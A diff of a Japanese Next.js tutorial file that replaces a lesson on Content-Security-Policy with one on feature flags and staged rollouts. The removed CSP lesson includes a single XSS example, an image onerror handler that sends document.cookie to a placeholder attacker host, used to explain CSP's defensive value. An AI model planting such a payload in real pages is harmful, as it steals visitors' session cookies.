@@ -1,455 +1,419 @@
-# lesson121: Content-Security-Policy（CSP）実践
+# lesson120: フィーチャーフラグ
 
 ## ゴール
 
-- CSP が **XSS の最後の砦** として何を防ぐか説明できる
-- `default-src` / `script-src` / `style-src` 等の主要ディレクティブを書ける
-- `nonce` / `hash` で **必要な inline script を許可** できる
-- `Content-Security-Policy-Report-Only` で本番に出す前の検証ができる
-- Next.js で CSP を **proxy + Middleware で動的に発行** できる
-
-::: tip 前提
-このレッスンは「Cookie と Web セキュリティ」の発展編です。XSS / CSRF の基本は「Cookie と Web セキュリティ」を確認してください。
-:::
+- フィーチャーフラグが「**デプロイ** と **機能公開** を分離する」考え方であることを説明できる
+- 環境変数ベースの最小実装ができる
+- ロールアウト（10% → 50% → 100%）の意義を理解する
+- LaunchDarkly / GrowthBook / Vercel Edge Config / Statsig の位置付けが分かる
+- A/B テストとフィーチャーフラグの違いと重なりを説明できる
 
 ## 解説
 
-### CSP は最後の防衛線
+### 背景: 「リリース」と「公開」を切り離したい
 
-XSS の理想は「**そもそも入力をエスケープして XSS を起こさない**」こと（「Cookie と Web セキュリティ」）。けれど、ライブラリのバグ / Markdown のレンダリング / 古い jQuery など、**完璧に守るのは難しい**。
+新機能をリリースすると、次の不安が常に付きまといます。
 
-Content-Security-Policy は「**仮に攻撃スクリプトが混入しても、ブラウザが読み込みを拒否する**」という二重の防衛線です。
+- **本番で初めて壊れたら？**
+- **想定外のトラフィックで重くなったら？**
+- **特定ユーザーだけが踏むバグがあったら？**
 
-仕組みは「**HTTP レスポンスヘッダ** で `<script>` / `<style>` / 画像 / fetch などの **読み込み元を許可リスト形式で指定**」。
+従来の「**ビルドして本番にデプロイ → 全ユーザーに公開**」は、不具合が出た瞬間に **ロールバックしか選択肢がない** という弱さがあります。
 
-### 最小例
-
-```http
-Content-Security-Policy: default-src 'self';
-```
-
-これだけで:
-
-- 自分のドメイン以外からの **JS / CSS / 画像 / fetch** がブロックされる
-- inline script（`<script>...</script>`）も **デフォルト拒否**
-- inline style（`<div style="...">`）も拒否
-
-なぜ inline まで拒否するのか:
-
-```html
-<!-- 攻撃者が混入させたい -->
-<img src="x" onerror="fetch('https://attacker.com?c='+document.cookie)" />
-```
-
-これを **inline script 全面禁止** にすると、たとえ XSS で混入しても **実行されません**。
-
-### 主要ディレクティブ
-
-| ディレクティブ | 制御するリソース |
-|---|---|
-| `default-src` | 他で指定がないリソース全部のフォールバック |
-| `script-src` | JavaScript |
-| `style-src` | CSS |
-| `img-src` | `<img>` |
-| `font-src` | フォント |
-| `connect-src` | `fetch` / `XMLHttpRequest` / `WebSocket` |
-| `frame-src` | `<iframe>` |
-| `media-src` | `<audio>` / `<video>` |
-| `object-src` | `<object>` / `<embed>`（`'none'` 推奨） |
-| `base-uri` | `<base>` タグの `href` |
-| `form-action` | `<form>` の `action` |
-| `frame-ancestors` | 自分を `<iframe>` で **埋め込ませる相手**（Clickjacking 対策） |
-
-### ソース指定子
-
-| 値 | 意味 |
-|---|---|
-| `'self'` | 自分のオリジン |
-| `'none'` | すべて拒否 |
-| `'unsafe-inline'` | inline script / style を許可（**極力避ける**） |
-| `'unsafe-eval'` | `eval()` / `new Function()` 許可（**極力避ける**） |
-| `https:` | あらゆる HTTPS オリジン |
-| `https://example.com` | 個別オリジン |
-| `*.example.com` | サブドメインワイルドカード |
-| `'nonce-XXXXX'` | ランダムナンス付きの inline を許可 |
-| `'sha256-XXXX'` | 特定のハッシュ値の inline を許可 |
-| `'strict-dynamic'` | nonce/hash 付きの script から **動的に読み込まれた script** を許可 |
-
-### inline script を許可する 3 つの方法
-
-「Google Analytics や OGP 系の inline `<script>` だけは動かしたい」場合の対応。
-
-#### 1. `'unsafe-inline'`（NG）
-
-`Content-Security-Policy: script-src 'self' 'unsafe-inline';`
-
-→ **すべての inline を許可** してしまうので XSS を防げない。**最終手段**。
-
-#### 2. nonce（推奨）
-
-リクエストごとに **ランダムな文字列**（nonce）をサーバーで生成し:
-
-- ヘッダに `script-src 'nonce-abc123' 'self';`
-- `<script nonce="abc123">...</script>`
-
-両方が一致した script だけ実行される。**毎回違う値** なので攻撃者は予測できない。
-
-#### 3. hash
-
-inline script の **SHA-256 ハッシュ** を `script-src 'sha256-XXX'` で許可。**内容が固定** な inline 限定。
-
-### `'strict-dynamic'`
-
-nonce / hash で許可した script が **動的に追加した子 script** をすべて許可する仕組み。許可リストを長く書かずに済む。
+フィーチャーフラグ（Feature Flag、Feature Toggle）は **「コードはデプロイ済み、機能は OFF」の状態を作る** 仕組みです。
 
 ```
-script-src 'nonce-abc123' 'strict-dynamic';
+[ デプロイ ]──────────────[ 機能公開 ]
+     │                         │
+     ↓                         ↓
+  GitHub で merge          管理画面で ON
+   = 全ユーザーに            = 特定の人 / %
+     コードが届く              に出す
 ```
 
-これが現代の **推奨ポリシー** です（Google が CSP Level 3 でプッシュ）。
+これによって:
 
-### `Report-Only` で先に検証
+- **5% に出してから様子を見る**
+- **問題が出たら 1 クリックで戻す**（ビルド不要）
+- **社内ユーザーだけ先行公開**
+- **A/B テスト**（バリアント A と B の効果を比較）
 
-本番に正しい CSP をいきなり当てると **動かなくなるリスク** が高い。`Content-Security-Policy-Report-Only` を使うと:
+### 最小実装: 環境変数で
 
-- ブラウザは **違反をブロックせず**
-- 違反を **`report-uri` / `report-to`** に POST してくれる
-
-```
-Content-Security-Policy-Report-Only:
-  default-src 'self';
-  report-uri /csp-report;
-  report-to csp-endpoint;
-```
+「とりあえず ON / OFF を切り替えたい」だけなら、**環境変数 1 つ** で十分です。Server Component で評価する形がもっとも安全です。
 
 ```ts
-// app/api/csp-report/route.ts
-export async function POST(req: Request) {
-  const body = await req.json();
-  console.log("CSP violation:", body);
-  return new Response(null, { status: 204 });
-}
+// .env.production
+NEW_CHECKOUT=false
 ```
-
-数日〜数週間ログを集めて、漏れなく許可リストを揃えてから **本番ヘッダ** に切り替えます。
-
-Sentry や Datadog の **CSP レポート機能** を使うとダッシュボードで一覧できます。
-
-### Next.js での実装
-
-#### 静的なポリシー（next.config.ts のヘッダ）
-
-```ts
-// next.config.ts
-import type { NextConfig } from "next";
-
-const cspHeader = `
-  default-src 'self';
-  script-src 'self' 'unsafe-inline' 'unsafe-eval';
-  style-src 'self' 'unsafe-inline';
-  img-src 'self' data: https:;
-  font-src 'self' https://fonts.gstatic.com;
-  connect-src 'self';
-  frame-ancestors 'none';
-  base-uri 'self';
-  form-action 'self';
-`.replace(/\s{2,}/g, " ").trim();
-
-const nextConfig: NextConfig = {
-  async headers() {
-    return [
-      {
-        source: "/:path*",
-        headers: [
-          { key: "Content-Security-Policy", value: cspHeader },
-          { key: "X-Frame-Options", value: "DENY" },
-          { key: "X-Content-Type-Options", value: "nosniff" },
-          { key: "Referrer-Policy", value: "strict-origin-when-cross-origin" },
-        ],
-      },
-    ];
-  },
-};
-
-export default nextConfig;
-```
-
-::: warning Next.js は inline をたくさん使う
-Next.js は SSR したマークアップに **inline script を埋め込んで** ハイドレーションを行います。Tailwind v3 までの開発ビルドや next/script の inline モードも inline style / script を生成します。
-
-そのため `'unsafe-inline'` 抜きの厳格な CSP を当てるには **nonce 方式** が必須。
-:::
-
-#### 動的なポリシー（Proxy + nonce）
-
-Next.js 16 では `proxy.ts`（旧 middleware.ts）でリクエスト時に nonce を生成し、ヘッダで配ります。
-
-```ts
-// proxy.ts
-import { NextResponse, type NextRequest } from "next/server";
-
-export function proxy(req: NextRequest) {
-  const nonce = Buffer.from(crypto.randomUUID()).toString("base64");
-  const csp = `
-    default-src 'self';
-    script-src 'self' 'nonce-${nonce}' 'strict-dynamic';
-    style-src 'self' 'nonce-${nonce}';
-    img-src 'self' data: https:;
-    font-src 'self';
-    connect-src 'self';
-    frame-ancestors 'none';
-    base-uri 'self';
-    form-action 'self';
-    upgrade-insecure-requests;
-  `.replace(/\s{2,}/g, " ").trim();
-
-  const requestHeaders = new Headers(req.headers);
-  requestHeaders.set("x-nonce", nonce);
-  requestHeaders.set("Content-Security-Policy", csp);
-
-  const response = NextResponse.next({ request: { headers: requestHeaders } });
-  response.headers.set("Content-Security-Policy", csp);
-
-  return response;
-}
-
-export const config = {
-  matcher: [
-    "/((?!api|_next/static|_next/image|favicon.ico).*)",
-  ],
-};
-```
-
-#### Server Component で nonce を読む
 
 ```tsx
-// app/layout.tsx
-import { headers } from "next/headers";
-import Script from "next/script";
-
-export default async function RootLayout({ children }: { children: React.ReactNode }) {
-  const nonce = (await headers()).get("x-nonce") ?? undefined;
-
-  return (
-    <html lang="ja">
-      <body>
-        {children}
-        <Script
-          src="https://example.com/analytics.js"
-          nonce={nonce}
-          strategy="afterInteractive"
-        />
-      </body>
-    </html>
-  );
+// app/checkout/page.tsx (Server Component)
+export default function CheckoutPage() {
+  if (process.env.NEW_CHECKOUT === "true") {
+    return <NewCheckout />;
+  }
+  return <LegacyCheckout />;
 }
 ```
 
-`next/script` は **`nonce` prop** を渡すと自動で属性に反映してくれます。
+> **補足: `NEXT_PUBLIC_` プレフィックスはクライアントに丸見え**: `NEXT_PUBLIC_` で始まる環境変数は **ビルド時にクライアントバンドルに埋め込まれます**。ブラウザの DevTools で JS を眺めれば値も変数名もそのまま見えます。`NEXT_PUBLIC_NEW_CHECKOUT` のようにフラグ名を `NEXT_PUBLIC_` で出すと「未公開機能の存在」「フラグ名の命名規則」がエンドユーザーに漏れる事故になります。**Server Component で評価できる場合はプレフィックスなしの `process.env.NEW_CHECKOUT`** を使い、どうしても Client Component で参照したい場合だけ `NEXT_PUBLIC_` を付けます。
 
-### Trusted Types
+メリット:
 
-CSP の進化版が **Trusted Types**。`document.innerHTML = userInput` のような **危険な代入** を **型レベル** で禁止します。
+- 何も足さずに始められる
+- ビルド時に値が **インライン** されるので実行時オーバーヘッドゼロ
 
+デメリット:
+
+- 切り替えに **再ビルド + デプロイ** が必要（瞬時には変えられない）
+- ユーザー単位で出し分けできない
+- A/B テストには使えない
+
+「**動作確認用 / 開発中の機能を本番に隠す**」程度なら環境変数で十分。**運用で柔軟に切り替えたい** なら次のステップへ。
+
+### 中規模実装: 設定をリモート管理
+
+ビルドし直さずに切り替えたいなら、**フラグの値を外部から取得** します。
+
+```ts
+// utils/flags.ts
+type Flags = { newCheckout: boolean; aiSummary: boolean };
+
+let cached: Flags | null = null;
+
+export async function getFlags(): Promise<Flags> {
+  if (cached) return cached;
+  const res = await fetch("https://api.example.com/flags", { cache: "no-store" });
+  cached = await res.json();
+  return cached!;
+}
 ```
-Content-Security-Policy: require-trusted-types-for 'script';
+
+```tsx
+// app/page.tsx
+import { getFlags } from "@/utils/flags";
+
+export default async function Home() {
+  const flags = await getFlags();
+  return flags.newCheckout ? <NewCheckout /> : <LegacyCheckout />;
+}
 ```
 
-未対応ブラウザ（Safari）でも壊れずに、対応ブラウザでさらに守りが厚くなる。**新規プロジェクトは Trusted Types を入れる** が 2026 年の推奨。
+API のバックエンドは:
 
-### 確認ツール
+- 自前のテーブル（Postgres / Redis）
+- **Vercel Edge Config**（Vercel 公式の超低遅延 KV）
+- Cloudflare KV / R2
 
-- [CSP Evaluator](https://csp-evaluator.withgoogle.com/)（Google 提供）: 自分の CSP がどれくらい強いかを採点
-- [Mozilla Observatory](https://observatory.mozilla.org/): CSP を含むセキュリティヘッダ全般を診断
-- ブラウザの DevTools → Network → ヘッダ表示
+Vercel Edge Config の例:
 
-### CSP 以外のセキュリティヘッダ
+```ts
+import { get } from "@vercel/edge-config";
 
-| ヘッダ | 役割 |
+const newCheckout = await get<boolean>("newCheckout");
+```
+
+**ms 単位で読める** ので、ページレンダリングの先頭で読んでも遅くなりません。
+
+### ユーザーに紐付くロールアウト
+
+「10% に出す」「特定の社員だけに出す」を実現するには **ユーザー識別子** が要ります。
+
+```ts
+function isFeatureEnabled(userId: string, percent: number): boolean {
+  // ユーザー ID をハッシュ → 0〜99 にマップ
+  const hash = simpleHash(userId) % 100;
+  return hash < percent;
+}
+
+const enabled = isFeatureEnabled(currentUser.id, 10); // 10% の人だけ true
+```
+
+ハッシュベースだと、**同じユーザーは毎回同じ結果**（再現性）が得られます。「今回は ON、次回は OFF」を防げる。
+
+### SaaS の選択肢
+
+機能が複雑になると自前は辛いので SaaS を使います。
+
+| サービス | 特徴 |
 |---|---|
-| `Strict-Transport-Security` | HTTPS 強制 |
-| `X-Content-Type-Options: nosniff` | MIME スニッフィング無効化 |
-| `Referrer-Policy: strict-origin-when-cross-origin` | リファラーの漏洩抑制 |
-| `Permissions-Policy` | カメラ / マイク等の権限を制限 |
-| `Cross-Origin-Opener-Policy: same-origin` | Spectre 系対策 |
-| `Cross-Origin-Embedder-Policy: require-corp` | 同上 |
+| **LaunchDarkly** | エンタープライズ標準。機能フラグ + 実験機能 + 監査ログ。価格は高め |
+| **GrowthBook** | OSS + クラウド。**A/B テスト統計が強い**。コスパ良し |
+| **Statsig** | フラグ + 実験 + プロダクト分析統合。Meta 出身チーム |
+| **Flagsmith** | OSS / セルフホスト可能 |
+| **Vercel Edge Config + Vercel Toolbar** | Vercel 内製の軽量フラグ |
+| **PostHog Feature Flags** | Analytics と統合 |
 
-CSP と一緒に **これら 5〜6 個も設定** するのが現代の標準。Vercel ダッシュボード / Cloudflare の管理画面で **テンプレート** が用意されています。
+#### LaunchDarkly の最小例
 
-### よくある事故
+```bash
+npm install launchdarkly-react-client-sdk
+```
 
-#### 1. Google Fonts / Google Tag Manager が動かない
+```tsx
+import { withLDProvider, useFlags } from "launchdarkly-react-client-sdk";
 
-→ `script-src` / `style-src` / `font-src` / `connect-src` に Google のホストを許可する。具体的には `https://fonts.googleapis.com` / `https://fonts.gstatic.com` / `https://www.googletagmanager.com`。
+function App() {
+  const flags = useFlags();
+  return flags.newCheckout ? <NewCheckout /> : <LegacyCheckout />;
+}
 
-#### 2. Sentry / Datadog の送信が拒否される
+export default withLDProvider({
+  clientSideID: process.env.NEXT_PUBLIC_LD_CLIENT_ID!,
+  context: { kind: "user", key: "user-123", email: "user@example.com" },
+})(App);
+```
 
-→ `connect-src` に Sentry のエンドポイントを追加
+管理画面で「`newCheckout` を 5% に」と設定すれば、再デプロイなしで反映。
 
-#### 3. 開発時のホットリロードが拒否される
+> **補足: 環境ごとに SDK key を分ける**: フラグ SaaS では **Production / Preview / Development それぞれに別の SDK key を発行** できます。同じ key を全環境で使い回すと、Preview デプロイの動作確認が **本番フラグの評価ログを汚す**、A/B テストの母数に開発者の挙動が混ざる、本番フラグを誤って Preview から ON にしてしまう、といった事故になります。Vercel なら `Settings → Environment Variables` で `NEXT_PUBLIC_LD_CLIENT_ID` を **Production / Preview / Development の 3 つに分けて設定する** のが定石です。
 
-→ 開発時は `connect-src` に `ws://localhost:*` を加える、または開発時は CSP を緩める分岐を入れる
+#### GrowthBook の最小例
 
-#### 4. iframe 埋め込みされる事故
+```bash
+npm install @growthbook/growthbook-react
+```
 
-→ `frame-ancestors 'none'` で防ぐ（X-Frame-Options より上位の指定）
+```tsx
+import { GrowthBook, GrowthBookProvider, useFeatureIsOn } from "@growthbook/growthbook-react";
+
+const gb = new GrowthBook({
+  apiHost: "https://cdn.growthbook.io",
+  clientKey: process.env.NEXT_PUBLIC_GB_CLIENT_KEY,
+  attributes: { id: currentUser.id },
+});
+
+await gb.loadFeatures();
+
+function NewCheckoutGuard() {
+  const enabled = useFeatureIsOn("new-checkout");
+  return enabled ? <NewCheckout /> : <LegacyCheckout />;
+}
+
+<GrowthBookProvider growthbook={gb}>
+  <NewCheckoutGuard />
+</GrowthBookProvider>
+```
+
+### A/B テストとの関係
+
+フィーチャーフラグは「**ON か OFF か**」、A/B テストは「**A 案と B 案、どちらの効果が高いか**」を測るもの。
+
+実装は近く、フラグ系 SaaS は両方こなします。
+
+```ts
+// バリアント割当
+const variant = useExperiment("checkout-flow"); // "control" or "v2"
+
+return variant === "v2" ? <NewCheckout /> : <LegacyCheckout />;
+```
+
+A/B テストは **統計的な有意差** の判定が必要なので、SaaS の機能（Bayesian / Frequentist のテスト統計）を活用します。
+
+### Kill Switch（緊急停止）
+
+フィーチャーフラグの **大きな価値** がこれ。本番で問題が起きた時に **コードを巻き戻さず** に機能を即 OFF にできる。
+
+- 「決済 v2 を ON にしたら障害」→ 管理画面で OFF に
+- 「新検索が API を叩きすぎ」→ OFF に
+
+ロールバック（git revert + 再デプロイ）が **数分** かかるのに対し、フラグ OFF は **数秒**。これが本番運用の安心感に直結します。
+
+### フラグの寿命管理
+
+フラグは増えると **コードが if 地獄** になります。**寿命を管理** する習慣が大事。
+
+| フラグの種類 | 寿命の目安 |
+|---|---|
+| Release flag（新機能の段階公開） | 公開完了後すぐ削除 |
+| Experiment flag（A/B テスト） | 結果が出たら削除 |
+| Ops flag（緊急停止用） | 長期保存 |
+| Permission flag（権限による出し分け） | 永続 |
+
+「**Release flag は公開後 2 週間で削除**」のようなルールを決めて、定期清掃します。
+
+#### lint で検出
+
+GrowthBook / LaunchDarkly などの SaaS は「**コードに残っているフラグ一覧**」を検出する CLI を提供しています。CI で「3 ヶ月使われていないフラグ」を warning 出力するのが有効。
+
+### サーバー / クライアント / Edge
+
+Next.js のような SSR / RSC 環境では「**フラグをどこで評価するか**」が重要です。
+
+| 場所 | 例 |
+|---|---|
+| **Server Component** | `await getFlag()` を直接呼ぶ。SSR でフラグ反映 |
+| **Edge Middleware** | リクエストヘッダで分岐し、A/B 用に URL を書き換え |
+| **Client Component** | `useFlag()` フックでクライアントサイド分岐。**ハイドレーション後の表示揺れ** に注意 |
+
+クライアント側だけで分岐すると、ハイドレーションの瞬間に「**ON → OFF のチラつき**」が出ることがあります。なるべく **サーバー側で確定** させて RSC として配るのが安全。
+
+### よくある失敗
+
+#### 1. フラグの ON / OFF が複雑になりすぎる
+
+`if (flag1 && (flag2 || flag3) && !flag4) { ... }` のような状態は **テスト不可能**。フラグは独立に動かす設計を。
+
+#### 2. デフォルト値の事故
+
+ネットワークが落ちた時 / API 失敗時の **fallback 値** を必ず決める。
+
+```ts
+const enabled = (await getFlag("newCheckout")) ?? false; // 失敗時は OFF
+```
+
+#### 3. クライアント露出
+
+「管理画面用フラグ」をクライアントから読めるようにすると、**敵対的なユーザーが ON にしてしまう** 可能性がある。**サーバー側で評価** が原則。
+
+#### 4. 削除されないフラグ
+
+書いたまま忘れて、**コードが永遠に if で分岐**。定期的な清掃を。
 
 ## 演習
 
 ### ゴール
 
-- Next.js プロジェクトに **動的 nonce CSP** を入れる
-- まず Report-Only で違反ログを取り、最終的に強制ヘッダに切り替える
+- 環境変数ベースのフラグから始め、リモート管理ベースに育てる
+- ユーザー ID ベースの 10% ロールアウトを実装する
 
 ### 手順 1: 新規プロジェクト
 
 ```bash
-npx create-next-app@latest csp-sample --ts --app
-cd csp-sample
+npx create-next-app@latest flags-sample --ts --app
+cd flags-sample
 ```
 
-### 手順 2: Report-Only で開始
+### 手順 2: 環境変数フラグ
 
-`next.config.ts`:
+`.env.local`:
 
-```ts
-const reportOnlyCsp = `
-  default-src 'self';
-  script-src 'self' 'unsafe-inline';
-  style-src 'self' 'unsafe-inline';
-  img-src 'self' data:;
-  connect-src 'self';
-  frame-ancestors 'none';
-  report-uri /api/csp-report;
-`.replace(/\s{2,}/g, " ").trim();
-
-export default {
-  async headers() {
-    return [
-      {
-        source: "/:path*",
-        headers: [
-          { key: "Content-Security-Policy-Report-Only", value: reportOnlyCsp },
-          { key: "X-Frame-Options", value: "DENY" },
-          { key: "X-Content-Type-Options", value: "nosniff" },
-          { key: "Referrer-Policy", value: "strict-origin-when-cross-origin" },
-        ],
-      },
-    ];
-  },
-};
 ```
-
-### 手順 3: レポートエンドポイント
-
-`app/api/csp-report/route.ts`:
-
-```ts
-export async function POST(req: Request) {
-  const text = await req.text();
-  console.log("[CSP Report]", text);
-  return new Response(null, { status: 204 });
-}
+NEW_HOMEPAGE=true
 ```
-
-### 手順 4: わざと違反を起こす
 
 `app/page.tsx`:
 
 ```tsx
 export default function Home() {
+  const newHomepage = process.env.NEW_HOMEPAGE === "true";
   return (
     <main style={{ padding: 24 }}>
-      <h1>CSP Demo</h1>
-      <img src="https://example.com/some-image.png" alt="" />
-      <iframe src="https://example.com" />
+      <h1>{newHomepage ? "新ホーム" : "旧ホーム"}</h1>
     </main>
   );
 }
 ```
 
-`npm run dev` で開くと、外部画像 / iframe の読み込みが **CSP 違反** として検出され、サーバーログに `[CSP Report]` が出力されるはずです。違反は **ブロックされず**、画面は表示される（Report-Only のため）。
+`.env.local` の値を `false` に変えて再起動すると、表示が切り替わります。
 
-### 手順 5: 動的 nonce に切り替える
+### 手順 3: ユーザー ID ベースのロールアウト
 
-`proxy.ts`:
+`utils/rollout.ts`:
 
 ```ts
-import { NextResponse, type NextRequest } from "next/server";
-
-export function proxy(req: NextRequest) {
-  const nonce = Buffer.from(crypto.randomUUID()).toString("base64");
-  const csp = `
-    default-src 'self';
-    script-src 'self' 'nonce-${nonce}' 'strict-dynamic';
-    style-src 'self' 'nonce-${nonce}';
-    img-src 'self' data:;
-    connect-src 'self';
-    frame-ancestors 'none';
-    upgrade-insecure-requests;
-  `.replace(/\s{2,}/g, " ").trim();
-
-  const requestHeaders = new Headers(req.headers);
-  requestHeaders.set("x-nonce", nonce);
-
-  const res = NextResponse.next({ request: { headers: requestHeaders } });
-  res.headers.set("Content-Security-Policy", csp);
-  return res;
+function hash(s: string): number {
+  let h = 2166136261;
+  for (let i = 0; i < s.length; i++) {
+    h ^= s.charCodeAt(i);
+    h = (h * 16777619) >>> 0;
+  }
+  return h;
 }
 
-export const config = {
-  matcher: [
-    "/((?!api|_next/static|_next/image|favicon.ico).*)",
-  ],
-};
+export function isInRollout(userId: string, percent: number): boolean {
+  return hash(userId) % 100 < percent;
+}
 ```
 
-`app/layout.tsx`:
+`app/page.tsx`:
 
 ```tsx
-import { headers } from "next/headers";
-import Script from "next/script";
+import { isInRollout } from "@/utils/rollout";
 
-export default async function RootLayout({ children }: { children: React.ReactNode }) {
-  const nonce = (await headers()).get("x-nonce") ?? undefined;
+const FAKE_USERS = ["user-1", "user-2", "user-3", "user-4", "user-5"];
+
+export default function Home() {
   return (
-    <html lang="ja">
-      <body>
-        {children}
-        <Script id="hello" nonce={nonce}>
-          {`console.log('hello with nonce')`}
-        </Script>
-      </body>
-    </html>
+    <main style={{ padding: 24 }}>
+      <h1>10% ロールアウトのデモ</h1>
+      <ul>
+        {FAKE_USERS.map((id) => (
+          <li key={id}>
+            {id}: {isInRollout(id, 10) ? "ON" : "OFF"}
+          </li>
+        ))}
+      </ul>
+    </main>
+  );
+}
+```
+
+10% に絞ると **ほとんどの user が OFF**、50% にすると半々、と **再現性** を持って分かれることを確認します。
+
+### 手順 4: フラグを集約する
+
+`utils/flags.ts`:
+
+```ts
+import { isInRollout } from "./rollout";
+
+export type Flags = {
+  newCheckout: boolean;
+  aiSummary: boolean;
+};
+
+export function getFlags(userId: string): Flags {
+  return {
+    newCheckout: process.env.NEW_CHECKOUT === "true" && isInRollout(userId, 10),
+    aiSummary: process.env.AI_SUMMARY === "true",
+  };
+}
+```
+
+`app/dashboard/page.tsx`:
+
+```tsx
+import { getFlags } from "@/utils/flags";
+
+export default function Dashboard() {
+  const flags = getFlags("user-current");
+  return (
+    <main style={{ padding: 24 }}>
+      <h1>Dashboard</h1>
+      {flags.newCheckout && <p>新チェックアウト ON</p>}
+      {flags.aiSummary && <p>AI 要約 ON</p>}
+    </main>
   );
 }
 ```
 
 ### 期待出力
 
-- Report-Only モード: 違反は出るがブロックされず、サーバーに `[CSP Report]` ログ
-- 動的 nonce モード: `<script nonce="...">` を持つものだけ実行される
-- DevTools の Console に CSP 違反があると **赤い警告** が出る
+- `.env.local` の値を変えて再起動すると、`new` / `old` が切り替わる
+- ユーザー ID 別に ON / OFF が **再現性** を持って決まる
+- フラグを集約すると、ページごとの分岐が読みやすくなる
 
 ### 変える
 
-- `script-src` の `'strict-dynamic'` を外して、サードパーティ script が読み込めなくなることを確認
-- `frame-ancestors 'none'` を `'self'` に変えて、自サイト内の iframe 埋め込みは許可
-- Trusted Types を有効化（`require-trusted-types-for 'script'`）して、`innerHTML = userInput` がエラーになることを観察
+- 5%、25%、50%、100% に変えて、ロールアウトの比率を実感する
+- ハッシュ関数を `Math.random()` に変えると **同じユーザーで結果がバラつく** ことを確認（NG パターン）
+- フラグ評価を Server Component に閉じ込めて、クライアントには結果だけ渡す
 
 ### 自分で書く（任意）
 
-- Sentry / Datadog の送信が拒否されないよう、`connect-src` に該当エンドポイントを追加
-- Google Fonts を使うサイトで `style-src` / `font-src` / `connect-src` を整える
-- CSP Evaluator にヘッダを貼って **A 評価** を狙う
+- Vercel Edge Config を使ってフラグをリモート管理にする
+- GrowthBook の SDK を入れて、UI で % を変えて即時反映を体験する
+- A/B テスト用の variant 割当を実装し、analytics に variant をタグ付けして送る
 
 ## まとめ
 
-- CSP は **XSS の最後の砦**。攻撃 script が混入しても **読み込ませない**
-- `default-src 'self'` を起点に、必要に応じてディレクティブを追加
-- inline は **`'unsafe-inline'` を避け、nonce / hash + `'strict-dynamic'`** で許可
-- **`Content-Security-Policy-Report-Only`** で本番前に違反ログを集める
-- Next.js は **proxy** で nonce を発行し、`<Script>` の `nonce` prop で受け渡す
-- **Trusted Types** で `innerHTML = userInput` を型レベルで禁止
-- CSP と一緒に **STS / X-Content-Type-Options / Referrer-Policy / Permissions-Policy / COOP / COEP** も設定する
-- CSP Evaluator / Mozilla Observatory で診断
+- フィーチャーフラグは **デプロイと機能公開を分離** する仕組み
+- 最小実装は **環境変数 1 つ**。柔軟性を上げたければリモート管理（Edge Config / DB）
+- **ハッシュベース** のロールアウトで再現性を保つ
+- SaaS は LaunchDarkly / **GrowthBook** / Statsig / Flagsmith / Vercel + PostHog など
+- **Kill Switch** で本番障害をビルドなしに止められる価値が大きい
+- A/B テストはフラグの仲間。SaaS は両方こなす
+- フラグは増える → **寿命を管理して定期清掃**
+- Server / Edge で評価して **クライアントのチラつき** を避ける
